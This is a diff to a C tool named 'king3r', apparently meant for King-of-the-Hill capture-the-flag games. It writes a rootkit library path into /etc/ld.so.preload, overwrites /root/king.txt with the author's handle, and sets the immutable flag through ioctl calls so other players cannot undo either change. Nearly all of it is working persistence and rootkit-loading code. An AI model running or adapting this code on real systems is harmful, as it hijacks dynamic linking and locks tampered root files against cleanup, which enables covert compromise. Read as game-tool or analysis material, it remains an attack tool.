@@ -11,8 +11,10 @@
 
 // king3r (aka. kothv4)  ~@profxadke
 
+#define KG_PATH "/root/king.txt"
 #define RK_PATH "/etc/ld.so.preload"
 #define RK_TEXT "/usr/local/lib/rootkit.so"
+#define KG_TEXT "profxadke\n"
 
 
 int randint(int min, int max) {
@@ -34,6 +36,13 @@ void* kingMe(void* vargp) {
                 if (ioctl(fileno(fp), FS_IOC_SETFLAGS, &val) < 0)
                 perror("[unlock] ioctl(2) error");
             fclose(fp);
+        }; if ((afp = fopen(KG_PATH, "r")) == NULL) {
+            perror("[unlock] fopen(3) error");
+        } else {
+                int val = 0;
+                if (ioctl(fileno(afp), FS_IOC_SETFLAGS, &val) < 0)
+                perror("[unlock] ioctl(2) error");
+            fclose(afp);
         }
 
         // Write
@@ -42,6 +51,12 @@ void* kingMe(void* vargp) {
         }
         fputs(RK_TEXT, fp);
         fclose(fp);
+
+        if ((afp = fopen(KG_PATH, "w")) == NULL) {
+            perror("[write] fopen(3) error");
+        }
+        fputs(KG_TEXT, afp);
+        fclose(afp);
 
         // Change permissions + Lock
         if ((fp = fopen(RK_PATH, "r")) == NULL) {
@@ -52,6 +67,14 @@ void* kingMe(void* vargp) {
             if (ioctl(fileno(fp), FS_IOC_SETFLAGS, &vul) < 0)
                 perror("[lock] ioctl(2) error");
             fclose(fp);
+        }; if ((afp = fopen(KG_PATH, "r")) == NULL) {
+            perror("[chmod] fopen(3) error");
+        } else {
+            chmod(KG_PATH, S_IRUSR | S_IRGRP | S_IROTH);
+            int vul = 16;
+            if (ioctl(fileno(afp), FS_IOC_SETFLAGS, &vul) < 0)
+                perror("[lock] ioctl(2) error");
+            fclose(afp);
         }
 
     }; return NULL;
